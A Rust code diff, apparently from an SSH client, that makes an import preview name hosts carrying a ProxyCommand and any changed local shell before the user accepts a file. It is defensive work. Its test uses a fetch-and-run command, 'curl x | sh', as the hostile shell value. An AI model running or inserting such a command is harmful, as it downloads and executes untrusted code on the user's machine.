@@ -115,6 +115,13 @@ pub struct MergePlan {
     /// Host specs the file disagrees with us about. Never overwritten.
     pub host_key_conflicts: Vec<String>,
     pub has_settings: bool,
+    /// Incoming hosts, new here, that connect through a ProxyCommand: a
+    /// program run on this computer each time, which the user should know
+    /// about before taking a file from someone else.
+    pub proxy_command_hosts: Vec<String>,
+    /// The local shell command the file's settings would put in place, when
+    /// it is set and differs from the one in use.
+    pub local_shell: Option<String>,
 }
 
 #[derive(Debug, Clone, Default, Serialize)]
@@ -453,6 +460,19 @@ pub fn plan_merge(file: &ExportFile, payload: &Payload, current: &AppData) -> Me
         // parsing the file twice for a number the user acts on after the fact.
         host_key_conflicts: Vec::new(),
         has_settings: payload.settings.is_some(),
+        // A duplicate is skipped, so only a new host brings its command in.
+        proxy_command_hosts: payload
+            .servers
+            .iter()
+            .filter(|s| s.proxy_command.as_deref().is_some_and(|c| !c.trim().is_empty()))
+            .filter(|s| !current.servers.iter().any(|e| same_server(s, e)))
+            .map(|s| s.name.clone())
+            .collect(),
+        local_shell: payload
+            .settings
+            .as_ref()
+            .map(|s| s.local_shell.trim().to_string())
+            .filter(|shell| !shell.is_empty() && *shell != current.settings.local_shell.trim()),
     }
 }
 
@@ -923,6 +943,34 @@ mod tests {
         assert_eq!(plan.incoming.servers, 2);
         assert_eq!(plan.duplicates.servers, 1);
         assert!(plan.has_settings);
+    }
+
+    /// What the import would run on this computer is named before the user
+    /// agrees to it: new hosts with a proxy command, and a changed local
+    /// shell. A host already here is skipped, so its command is not news.
+    #[test]
+    fn the_plan_names_what_would_run_on_this_computer() {
+        let mut with_proxy = server("s1", "alpha.example", None, &key(1));
+        with_proxy.proxy_command = Some("nc %h %p".into());
+        let mut known_proxy = server("s2", "beta.example", None, &key(1));
+        known_proxy.proxy_command = Some("nc %h %p".into());
+        let payload = Payload {
+            servers: vec![with_proxy, known_proxy, server("s3", "gamma.example", None, &key(1))],
+            settings: Some(Settings { local_shell: "sh -c 'curl x | sh'".into(), ..Default::default() }),
+            ..Default::default()
+        };
+        let content = seal(&payload, "phrase");
+        let (file, opened, _) = open_export(&content, "phrase").unwrap();
+        let mut current = AppData::default();
+        current.servers.push(server("other", "beta.example", None, &key(2)));
+
+        let plan = plan_merge(&file, &opened, &current);
+        assert_eq!(plan.proxy_command_hosts, vec!["host s1".to_string()]);
+        assert_eq!(plan.local_shell.as_deref(), Some("sh -c 'curl x | sh'"));
+
+        // The same shell as the one in use is no change to warn about.
+        current.settings.local_shell = "sh -c 'curl x | sh'".into();
+        assert_eq!(plan_merge(&file, &opened, &current).local_shell, None);
     }
 
     /// The preview and the import have to agree about what is already here.
